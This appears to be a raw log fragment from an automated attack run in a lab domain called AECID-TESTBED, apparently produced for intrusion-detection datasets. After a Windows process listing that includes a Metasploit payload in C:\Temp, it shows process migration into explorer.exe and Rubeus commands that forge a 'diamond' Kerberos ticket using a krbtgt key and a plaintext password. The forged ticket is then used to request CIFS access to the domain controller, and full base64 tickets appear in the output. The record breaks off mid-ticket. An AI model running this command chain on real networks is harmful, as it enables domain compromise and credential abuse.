+ 1488  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1512  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1588  696   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1624  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1644  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1656  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1664  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1672  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1756  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1764  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1772  696   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1784  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1884  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1908  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1912  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1980  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2008  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2076  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 2104  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2140  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 2292  696   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 2460  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2648  696   spoolsv.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 2708  4712  fontdrvhost.exe              x64   2        Font Driver Host\UMFD-2       C:\Windows\System32\fontdrvhost.exe
+ 2756  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2764  696   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 2772  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2780  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2788  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2888  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2908  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2928  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2952  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2964  696   inetinfo.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\inetsrv\inetinfo.exe
+ 2972  696   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 2980  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2992  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 3012  696   wlms.exe                     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wlms\wlms.exe
+ 3096  696   Sysmon64.exe                 x64   0
+ 3260  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 3356  696   svchost.exe                  x64   2        AECID-TESTBED\Alice           C:\Windows\System32\svchost.exe
+ 3460  696   svchost.exe                  x64   0
+ 3480  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 3752  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 3840  2788  AggregatorHost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\AggregatorHost.exe
+ 4052  836   wsmprovhost.exe              x64   0        AECID-TESTBED\Alice           C:\Windows\System32\wsmprovhost.exe
+ 4316  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 4340  4332  csrss.exe                    x64   2
+ 4368  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 4408  836   unsecapp.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\unsecapp.exe
+ 4712  4332  winlogon.exe                 x64   2        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+ 4856  836   StartMenuExperienceHost.exe  x64   2        AECID-TESTBED\Alice           C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe
+ 4932  4712  dwm.exe                      x64   2        Window Manager\DWM-2          C:\Windows\System32\dwm.exe
+ 5132  836   SearchApp.exe                x64   2        AECID-TESTBED\Alice           C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
+ 5148  428   rdpclip.exe                  x64   2        AECID-TESTBED\Alice           C:\Windows\System32\rdpclip.exe
+ 5192  2952  sihost.exe                   x64   2        AECID-TESTBED\Alice           C:\Windows\System32\sihost.exe
+ 5216  696   svchost.exe                  x64   2        AECID-TESTBED\Alice           C:\Windows\System32\svchost.exe
+ 5256  696   svchost.exe                  x64   2        AECID-TESTBED\Alice           C:\Windows\System32\svchost.exe
+ 5296  2008  taskhostw.exe                x64   2        AECID-TESTBED\Alice           C:\Windows\System32\taskhostw.exe
+ 5384  836   RuntimeBroker.exe            x64   2        AECID-TESTBED\Alice           C:\Windows\System32\RuntimeBroker.exe
+ 5484  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 5596  5484  ctfmon.exe                   x64   2        AECID-TESTBED\Alice           C:\Windows\System32\ctfmon.exe
+ 5636  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 5680  6512  msf.exe                      x64   0        AECID-TESTBED\Alice           C:\Temp\msf.exe
+ 5696  836   TextInputHost.exe            x64   2        AECID-TESTBED\Alice           C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe
+ 5824  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 5888  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 6012  5988  explorer.exe                 x64   2        AECID-TESTBED\Alice           C:\Windows\explorer.exe
+ 6272  836   RuntimeBroker.exe            x64   2        AECID-TESTBED\Alice           C:\Windows\System32\RuntimeBroker.exe
+ 6496  696   svchost.exe                  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 6512  836   wsmprovhost.exe              x64   0        AECID-TESTBED\Alice           C:\Windows\System32\wsmprovhost.exe
+ 6520  836   RuntimeBroker.exe            x64   2        AECID-TESTBED\Alice           C:\Windows\System32\RuntimeBroker.exe
+ 6576  696   WUDFHost.exe                 x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\WUDFHost.exe
+ 6960  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 7016  696   msdtc.exe                    x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
+ 7056  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 7104  696   svchost.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 7136  696   svchost.exe                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+
+
+--- 2024-04-30 07:13:22 INFO: ---
+
+Command: .*explorer*.
+
+--- 2024-04-30 07:13:22 INFO: ---
+
+Command: (\d+) 
+
+--- 2024-04-30 07:13:22 INFO: ---
+
+Command: 6012
+
+--- 2024-04-30 07:13:23 INFO: ---
+
+Command: migrate 6012
+[*] Migrating from 5680 to 6012...
+
+--- 2024-04-30 07:13:26 INFO: ---
+
+Command: getuid
+[-] stdapi_sys_config_getuid: Operation failed: The request is not supported.
+
+--- 2024-04-30 07:13:27 INFO: ---
+
+Command: execute -f C:\\Temp\\Rubeus.exe -a "diamond /krbkey:a3e83d72a09a7143b9318adc5e26d4dc2e15d6519ffb9ed41140b43e5d16cb0a /user:Alice /password:Pa$$w0rd /enctype:aes /domain:aecid-testbed.com /dc:dc1.aecid-testbed.com /ticketuser:Alice /consoleoutfile:C:\Temp\diamond.txt /ptt /nowrap" -i
+Process 2512 created.
+Channel 1 created.
+
+--- 2024-04-30 07:13:29 INFO: ---
+
+Command: sleep
+Awake O_O
+--- 2024-04-30 07:13:39 INFO: ---
+
+Command: Get-Content C:\Temp\diamond.txt 
+
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.0
+
+[*] Action: Diamond Ticket
+
+[*] Using domain controller: dc1.aecid-testbed.com (192.168.10.228)
+[!] Pre-Authentication required!
+[!]	AES256 Salt: AECID-TESTBED.COMAlice
+[*] Using aes256_cts_hmac_sha1 hash: C7F3C993B462C8A98D5B7A58F705F0E8A2DFBF559F7C016E0EF47ACCC561B141
+[*] Building AS-REQ (w/ preauth) for: 'aecid-testbed.com\Alice'
+[*] Using domain controller: 192.168.10.228:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFsjCCBa6gAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoRMbEUFFQ0lELVRFU1RCRUQuQ09NoiYwJKADAgECoR0wGxsGa3JidGd0GxFBRUNJRC1URVNUQkVELkNPTaOCBFkwggRVoAMCARKhAwIBAqKCBEcEggRDNXOeXtvvN82A8yCG8AmadNJKCtkajsJFlD2hOvshg3kn+oc13UMIfe5grNXZ6eCr7zfurpSstL21WYvVH0xgA6LyrUSLfsNTIhEMfdmmI5u8prA0kJ8l7o9SvhooAoGJXxfTlM4KmpNyoH0fjUR2uuw7EoYoe0O5CC17DDHQvrpL1a5dJ4rSoETyNfM5Wf8Tp6tpiSi4bzCvlWWlbkEkXm46aVnNBmI7QFaXfV/sqW6IB6h9TrH4hs0nWinUkhEe0odys72ghXU3M8Gt/Fmr2ktzA4W3Jzats2CtNPH2xa/E4cpC3qWK61RV9xz43cqbqJMGbldiMhXgWIuejZNbMorEMiHI0bRPA3yYkYDtaUWNypn5eiUN9JzTTH54PxovjavYyIGyRomeNzvl074uQc+zkLCj2cV9B2uL5aWPzzGKvyVnvW7E3ufGNh2fuL9V5/n8CqeO7SX1tuzIXgh5tWinU1JUHkj+T3TC3k5xyzZ3qynSkJZ1Tv76Wdh6gvZCuQkWyalIg74cJ7AnWLdJM9/NRQYycvww232Ajh6M7iOptZnbdrhQ7A+zaRSF7xTNVhCBE2KLhJ/KWA6Y72LY8/gk/QSbtODFvAPWti7XTQEPCv5/Ls4X4dJ2cuad4kmrRfdI16fKkPTlyWCrFkN9V53NI3KZFkEhN52Czc0woILN0KNQQvIaN2CC5Vx1aN3ACH5c4SOhgGqidyEtQKSJ7g6R2ND0yqzPlkjdWTO76yQ2d/OO+KmVBJDQq1QWVJILyQn3Ras/YaLs6XywpYP5Ickd5NXKkGk7m3INek1sSbYcrMDxlL4WbzMGjiw0H8Eh3ILq/a2Yg/xL37M2uFE1DB+vmaXVapnSMVt3Xr1zwLjAneFbDCwvawPFwcnfDYS/GUzVZEcpUgLNGpy4W5fOfatyPM+YfIuBkn1afxYj6/riGnLlWVJ3wmI58IRc3OSxgBZncZLQmWJPf72eY8rI0PM9IznFY7de6MKxW0iaq+g+oFf8s6uOjmAQgGAK3LhH9y+hlvFAAFoO7Ri17/jNfLCCIWra2jRZ8Ha2LnCjinhCYSO2eckK+c+uZrZJkCtgx2iWoGuWrf+6dGduUXG9F87VlprtMW32PjO00PF/B1jkFwUoyjNfFtxir6kzrlyyX0sLD18e+rgkDz79SIvf9x35l6HLoaK5Fxij4Xd5P/MhXk0rDBns+O5xx7J91QzB2GYwfP92gdjqXRoZ0o9TGuMHlchhFrJht/fKNvwAtgYyki6tXXSamc0+aGwe5604T+VB7Z7xE+CjAMPDtc/yUHeMkaXHCOSnvc46V0iTGmmKV+SB0uZ6QjxmM/udrVJxCKH4DdZrGaBAsr0hzmwwxxJIDUkLkdu4wD/tDGrJCcotsQvPTdkVeE/yC2bOr+krciWrcXOZVLEecNSB7KUjfnemJMYU34WtRuuqvc5wydkz3HqjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCAaBq6IzW+9B9V09RnhVR0dwmt4WCJnLzont6hNLDAW3aETGxFBRUNJRC1URVNUQkVELkNPTaISMBCgAwIBAaEJMAcbBUFsaWNlowcDBQBA4QAApREYDzIwMjQwNDMwMDcxMzI2WqYRGA8yMDI0MDQzMDE3MTMyNlqnERgPMjAyNDA1MDcwNzEzMjZaqBMbEUFFQ0lELVRFU1RCRUQuQ09NqSYwJKADAgECoR0wGxsGa3JidGd0GxFBRUNJRC1URVNUQkVELkNPTQ==
+
+[*] Decrypting TGT
+[*] Retreiving PAC
+[*] Modifying PAC
+[*] Signing PAC
+[*] Encrypting Modified TGT
+
+[*] base64(ticket.kirbi):
+
+      doIFwjCCBb6gAwIBBaEDAgEWooIEuzCCBLdhggSzMIIEr6ADAgEFoRMbEUFFQ0lELVRFU1RCRUQuQ09NoiYwJKADAgECoR0wGxsGa3JidGd0GxFBRUNJRC1URVNUQkVELkNPTaOCBGkwggRloAMCARKhAwIBA6KCBFcEggRTFXv6MsFAN2ba+FgIR5OMn/iZy24nDSJfOCvbPmjG5Hb2ZeAp02uerNvySoM54Qewtdnmr/M74DkfG/yZroBegAfGqxDMND+B+/67Vo16I/jqnkmuq5DUrw2UOdVYfRjA1qyskOCT92YenM7hFwOG0iAPQfAEfR94oizRNk7gnr+RfyoI93IydB58I2Qq4SPMb3eXTzsK28xAdWYInqXLsOfMgWBFyW7LxeDSmdTxNoYMYZIcauKPAQNHN31TGAQ9tznCyEDWD6MK3alknI518mmYWj9APTaEawJMyIC0tjeq3LkIkL4UCdNShanPW0nUxjX0zlH88upVfuS/aFP4tSBwPmSx/8ZOlqeqa3GjJaWi85vptjZ51/VXA3MzsN6/hDm3dwa8kkPhBIfGJsGKog1LJ8lJlfd5bdt9ktxa6XA1NrqLffL3/usAjMy551TehoNOMwi6EAQ/Y64X79zxiIK5blsnovUVv+ms45rQnlRrmkVgBylKKX9NxW3zZsiqWoQ33+fXyHpLsgwc2r2pwnZp7Bzi81t29hE3GBHp5K3OieAC4s6W6AS8kViCNos8DGLZUNNBLrYWwD3rF6E0js73wNoEXPMdqMLEPmZSN79QQh4HjPPA1i9QB+fx3FyoU81ibQ+FbOU2jafCudMLP98AkoIlA6nSCClFy9w5ZXQ5xc0EWtMryvl7Ljxq+jzVAHGRu8JqWIHpJpIqY20rfcJXnyRzy893H4uMFcQOuL+rAcLbXkPLewQzis1vJJYs4kaO1hiHrdGYj71eVuEV4ARX8y+Mudp0m/OCl8sSBz45dmVprK1XARUY9HqW4yCeDsLq3RqCq3Ear3ffAxlTXgOHQLS6yLw80xcW7w6Ih5Rqs0YwhPonR273za79AA1QRZ5JtpR71ovf53nw6Eu2GMYWC5ixWZY/nvn+PVDO/ymd1CiSVUOEf4CZ2Koz6ZqlxcCzkid1rLpbmmgVXvK/pBRaT3lA+xXV2VjD9XV4HYfhjWPkA1ueMKLHYgR0Yw8ndqEQocjKEGMeZsld2a18oAFljXAOdXMJArwj3OxBOlLcmqZ5PEc8GpzULCft/3LyivY8fpCTK7T5TlrelsoUIkUyUKHPeFM9N0E3pxIOWaDekh6mYTh47e7+wckXeF+AfUF+Of1luHG+Neel+yan7ZAwivb0qmEkZG9Z9xX8urnMMlv6z1bMPGunSRnhHoUAXcBdJeUXXilfAeoES/xew9M5lCasewVr1mFrfbwys0uK2iOgEgx3UVVrvGxG2GMk2XGM7AMu5bZRoJnScpoaJFR5fdd4OhnynMyBf4Lcscsg0SMNQQKAciSyGM+xmGQbFzE8f4XesyaqZbL0qg4Gmon8eUk+QLDgdGr0/+aJAUohZqmd3/oVCaAikLexeencNLfdFiPkJ382wyaQKDSnpy7RCOSZKqv5mS1tD5HnCveH/PjIAyXqYDj2w9tBntQfdqBWo4HyMIHvoAMCAQCigecEgeR9geEwgd6ggdswgdgwgdWgKzApoAMCARKhIgQgGgauiM1vvQfVdPUZ4VUdHcJreFgiZy86J7eoTSwwFt2hExsRQUVDSUQtVEVTVEJFRC5DT02iEjAQoAMCAQGhCTAHGwVBbGljZaMHAwUAQOEAAKURGA8yMDI0MDQzMDA3MTMyNlqmERgPMjAyNDA0MzAxNzEzMjZapxEYDzIwMjQwNTA3MDcxMzI2WqgTGxFBRUNJRC1URVNUQkVELkNPTakmMCSgAwIBAqEdMBsbBmtyYnRndBsRQUVDSUQtVEVTVEJFRC5DT00=
+
+
+[+] Ticket successfully imported!
+
+--- 2024-04-30 07:13:39 INFO: ---
+
+Command:       (\S+)
+
+--- 2024-04-30 07:13:39 INFO: ---
+
+Command: doIFwjCCBb6gAwIBBaEDAgEWooIEuzCCBLdhggSzMIIEr6ADAgEFoRMbEUFFQ0lELVRFU1RCRUQuQ09NoiYwJKADAgECoR0wGxsGa3JidGd0GxFBRUNJRC1URVNUQkVELkNPTaOCBGkwggRloAMCARKhAwIBA6KCBFcEggRTFXv6MsFAN2ba+FgIR5OMn/iZy24nDSJfOCvbPmjG5Hb2ZeAp02uerNvySoM54Qewtdnmr/M74DkfG/yZroBegAfGqxDMND+B+/67Vo16I/jqnkmuq5DUrw2UOdVYfRjA1qyskOCT92YenM7hFwOG0iAPQfAEfR94oizRNk7gnr+RfyoI93IydB58I2Qq4SPMb3eXTzsK28xAdWYInqXLsOfMgWBFyW7LxeDSmdTxNoYMYZIcauKPAQNHN31TGAQ9tznCyEDWD6MK3alknI518mmYWj9APTaEawJMyIC0tjeq3LkIkL4UCdNShanPW0nUxjX0zlH88upVfuS/aFP4tSBwPmSx/8ZOlqeqa3GjJaWi85vptjZ51/VXA3MzsN6/hDm3dwa8kkPhBIfGJsGKog1LJ8lJlfd5bdt9ktxa6XA1NrqLffL3/usAjMy551TehoNOMwi6EAQ/Y64X79zxiIK5blsnovUVv+ms45rQnlRrmkVgBylKKX9NxW3zZsiqWoQ33+fXyHpLsgwc2r2pwnZp7Bzi81t29hE3GBHp5K3OieAC4s6W6AS8kViCNos8DGLZUNNBLrYWwD3rF6E0js73wNoEXPMdqMLEPmZSN79QQh4HjPPA1i9QB+fx3FyoU81ibQ+FbOU2jafCudMLP98AkoIlA6nSCClFy9w5ZXQ5xc0EWtMryvl7Ljxq+jzVAHGRu8JqWIHpJpIqY20rfcJXnyRzy893H4uMFcQOuL+rAcLbXkPLewQzis1vJJYs4kaO1hiHrdGYj71eVuEV4ARX8y+Mudp0m/OCl8sSBz45dmVprK1XARUY9HqW4yCeDsLq3RqCq3Ear3ffAxlTXgOHQLS6yLw80xcW7w6Ih5Rqs0YwhPonR273za79AA1QRZ5JtpR71ovf53nw6Eu2GMYWC5ixWZY/nvn+PVDO/ymd1CiSVUOEf4CZ2Koz6ZqlxcCzkid1rLpbmmgVXvK/pBRaT3lA+xXV2VjD9XV4HYfhjWPkA1ueMKLHYgR0Yw8ndqEQocjKEGMeZsld2a18oAFljXAOdXMJArwj3OxBOlLcmqZ5PEc8GpzULCft/3LyivY8fpCTK7T5TlrelsoUIkUyUKHPeFM9N0E3pxIOWaDekh6mYTh47e7+wckXeF+AfUF+Of1luHG+Neel+yan7ZAwivb0qmEkZG9Z9xX8urnMMlv6z1bMPGunSRnhHoUAXcBdJeUXXilfAeoES/xew9M5lCasewVr1mFrfbwys0uK2iOgEgx3UVVrvGxG2GMk2XGM7AMu5bZRoJnScpoaJFR5fdd4OhnynMyBf4Lcscsg0SMNQQKAciSyGM+xmGQbFzE8f4XesyaqZbL0qg4Gmon8eUk+QLDgdGr0/+aJAUohZqmd3/oVCaAikLexeencNLfdFiPkJ382wyaQKDSnpy7RCOSZKqv5mS1tD5HnCveH/PjIAyXqYDj2w9tBntQfdqBWo4HyMIHvoAMCAQCigecEgeR9geEwgd6ggdswgdgwgdWgKzApoAMCARKhIgQgGgauiM1vvQfVdPUZ4VUdHcJreFgiZy86J7eoTSwwFt2hExsRQUVDSUQtVEVTVEJFRC5DT02iEjAQoAMCAQGhCTAHGwVBbGljZaMHAwUAQOEAAKURGA8yMDI0MDQzMDA3MTMyNlqmERgPMjAyNDA0MzAxNzEzMjZapxEYDzIwMjQwNTA3MDcxMzI2WqgTGxFBRUNJRC1URVNUQkVELkNPTakmMCSgAwIBAqEdMBsbBmtyYnRndBsRQUVDSUQtVEVTVEJFRC5DT00=
+
+--- 2024-04-30 07:13:40 INFO: ---
+
+Command: execute -f C:\\Temp\\Rubeus.exe -a "asktgs /ticket:doIFwjCCBb6gAwIBBaEDAgEWooIEuzCCBLdhggSzMIIEr6ADAgEFoRMbEUFFQ0lELVRFU1RCRUQuQ09NoiYwJKADAgECoR0wGxsGa3JidGd0GxFBRUNJRC1URVNUQkVELkNPTaOCBGkwggRloAMCARKhAwIBA6KCBFcEggRTFXv6MsFAN2ba+FgIR5OMn/iZy24nDSJfOCvbPmjG5Hb2ZeAp02uerNvySoM54Qewtdnmr/M74DkfG/yZroBegAfGqxDMND+B+/67Vo16I/jqnkmuq5DUrw2UOdVYfRjA1qyskOCT92YenM7hFwOG0iAPQfAEfR94oizRNk7gnr+RfyoI93IydB58I2Qq4SPMb3eXTzsK28xAdWYInqXLsOfMgWBFyW7LxeDSmdTxNoYMYZIcauKPAQNHN31TGAQ9tznCyEDWD6MK3alknI518mmYWj9APTaEawJMyIC0tjeq3LkIkL4UCdNShanPW0nUxjX0zlH88upVfuS/aFP4tSBwPmSx/8ZOlqeqa3GjJaWi85vptjZ51/VXA3MzsN6/hDm3dwa8kkPhBIfGJsGKog1LJ8lJlfd5bdt9ktxa6XA1NrqLffL3/usAjMy551TehoNOMwi6EAQ/Y64X79zxiIK5blsnovUVv+ms45rQnlRrmkVgBylKKX9NxW3zZsiqWoQ33+fXyHpLsgwc2r2pwnZp7Bzi81t29hE3GBHp5K3OieAC4s6W6AS8kViCNos8DGLZUNNBLrYWwD3rF6E0js73wNoEXPMdqMLEPmZSN79QQh4HjPPA1i9QB+fx3FyoU81ibQ+FbOU2jafCudMLP98AkoIlA6nSCClFy9w5ZXQ5xc0EWtMryvl7Ljxq+jzVAHGRu8JqWIHpJpIqY20rfcJXnyRzy893H4uMFcQOuL+rAcLbXkPLewQzis1vJJYs4kaO1hiHrdGYj71eVuEV4ARX8y+Mudp0m/OCl8sSBz45dmVprK1XARUY9HqW4yCeDsLq3RqCq3Ear3ffAxlTXgOHQLS6yLw80xcW7w6Ih5Rqs0YwhPonR273za79AA1QRZ5JtpR71ovf53nw6Eu2GMYWC5ixWZY/nvn+PVDO/ymd1CiSVUOEf4CZ2Koz6ZqlxcCzkid1rLpbmmgVXvK/pBRaT3lA+xXV2VjD9XV4HYfhjWPkA1ueMKLHYgR0Yw8ndqEQocjKEGMeZsld2a18oAFljXAOdXMJArwj3OxBOlLcmqZ5PEc8GpzULCft/3LyivY8fpCTK7T5TlrelsoUIkUyUKHPeFM9N0E3pxIOWaDekh6mYTh47e7+wckXeF+AfUF+Of1luHG+Neel+yan7ZAwivb0qmEkZG9Z9xX8urnMMlv6z1bMPGunSRnhHoUAXcBdJeUXXilfAeoES/xew9M5lCasewVr1mFrfbwys0uK2iOgEgx3UVVrvGxG2GMk2XGM7AMu5bZRoJnScpoaJFR5fdd4OhnynMyBf4Lcscsg0SMNQQKAciSyGM+xmGQbFzE8f4XesyaqZbL0qg4Gmon8eUk+QLDgdGr0/+aJAUohZqmd3/oVCaAikLexeencNLfdFiPkJ382wyaQKDSnpy7RCOSZKqv5mS1tD5HnCveH/PjIAyXqYDj2w9tBntQfdqBWo4HyMIHvoAMCAQCigecEgeR9geEwgd6ggdswgdgwgdWgKzApoAMCARKhIgQgGgauiM1vvQfVdPUZ4VUdHcJreFgiZy86J7eoTSwwFt2hExsRQUVDSUQtVEVTVEJFRC5DT02iEjAQoAMCAQGhCTAHGwVBbGljZaMHAwUAQOEAAKURGA8yMDI0MDQzMDA3MTMyNlqmERgPMjAyNDA0MzAxNzEzMjZapxEYDzIwMjQwNTA3MDcxMzI2WqgTGxFBRUNJRC1URVNUQkVELkNPTakmMCSgAwIBAqEdMBsbBmtyYnRndBsRQUVDSUQtVEVTVEJFRC5DT00= /service:cifs/dc1.aecid-testbed.com /ptt /nowrap " -i 
+[*] Migration completed successfully.
+Process 4700 created.
+Channel 2 created.
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.0 
+
+[*] Action: Ask TGS
+
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+[*] Building TGS-REQ request for: 'cifs/dc1.aecid-testbed.com'
+[*] Using domain controller: atb-dc2.aecid-testbed.com (192.168.10.218)
+[+] TGS request successful!
+[+] Ticket successfully imported!
+[*] base64(ticket.kirbi):
+
+      doIFxjCCBcKgAwIBBaEDAgEWooIEvTCCBLlhggS1MIIEsaADAgEFoRMbEUFFQ0lELVRFU1RCRUQuQ09NoigwJqADAgECoR8wHRsEY2lmcxsVZGMxLmFlY2lkLXRlc3RiZWQuY29to4IEaTCCBGWgAwIBEqEDAgEEooIEVwSCBFNKLrjrynT9pQ4x1i90iRQjMs29bJZ5tUiGMzSYrj34DJwhNw+zkbHAx2RGorqQ8iVoVGxcX/pnBkhQSz3flp9EEkrmdcQeedZdjgDMotOVVOnYWW/aeIWU2g01xjpVvBDtTckGK+wNfT17VpHjaFwdw+pljMZWmMQfYckLtCtGyZnWaI0mazH566DmzVXOg9/cuGJreQ2UWuuUAdwwjOj5KXKrxSI8Z8OZsT1xWdkJH9jzfRaf00ScePwqcbSVqv3k/rzGgGbsUMc/c8igYnbE5T3qG8YGOqx2mUt9nx7EczhqUTw9jxA+wOcK9XbtIKz9jPMNVyogNpLp/PWsPDnIvFs6aEaeY3fNfayXgivqAhPcAT1ArEhs/GodUGCWjPebkXQ/9S2bpStFqTzevtPXuXTB08MPzZBy97NkX0jpsZQK7KPutefTD92+touRtTWDzQx97wDHAQQC2A8gqxWRkP4xoHicJ8BqLta5k6kE4NGUECfT1Qc0Bqh37ORFfppbUTzUERHDyDGx0uQSKWHf0fEYsbyIid4m9qa8L1dxm1x1MND/+kD8cGK5AiZ/OnOoQ7X0eVMBHzT0kKUFC107IUniqjvwczBfhGWOF9++m0ODarHERUJAzTXYxRZRTUVAvghVAdmW6gLxxNt10muv7Sk4peQpLn5UDfJWTMlFCjx5P4u7KG6dGa4CSalhkYF+a8pZEAZUQs6CzxJ5vWzBGq5hpAlnLRl60X3PaQbSBim17XX4Mvew0e6RhvbbEDjCqNe/awvDFJ7dMPtvTujCqRvHmx1sUaqGSmZ55GxcXlHuQwSAJU75+Dvu69NfGqd8meDooOQR9KFxo+RooQSqEskX9IQz3ln5+4Yi8iSE5Hcqf8IXQtr9+i6cdt0WTQ3gLqcxl5nibq300dyRqMfU+ZpuITUuqY8/MjYhaRejW39SDn8LvgmObWupuNwPpOIkl0SMLcyif11tmEq7Zg+9eCRWJCM0xbhQ+JbB3Ye1Y8IOrR/31Z1MqC0/2tK4Zlob2Be9b+F48BGetvwsgQ59CVClFvyI46f8F5NfPvAyL4JQMoTonYYK1Vr+GN4G182hM3uocmQCbfgMIrbD2JoSw5l7EG+NxPqIZuFeLVockSkaYtdg6Le/vXXeyVYaC55sQTExTosbVmOLviPjU2n4s8/dwyaHphEdtCE5yepWQZKfjouHCfL10XaBO3DGgkZ5DHPNd/ZjFvMG2IvglxXiectBjR6l8sSa2XT3QpgkbcqOJycJy+FPw8LMhLvi+HfyYRjbQHN829zSd7klztMoqQhdfkByxgLBDQ7mp/GHnYQulZhSyNLKzntsTKA06XffKF7c9Kgh+nEkEgL29yybZTbgdW8q1T6fAK/MpRTvin5/AG2jvac6QDi+rt0zzpZNzG0HrTQtNGq3dNOk+1UnDvI7utRyJTwQfXDRzO0CzMJkEPfLVUaVD37gY48PkFliW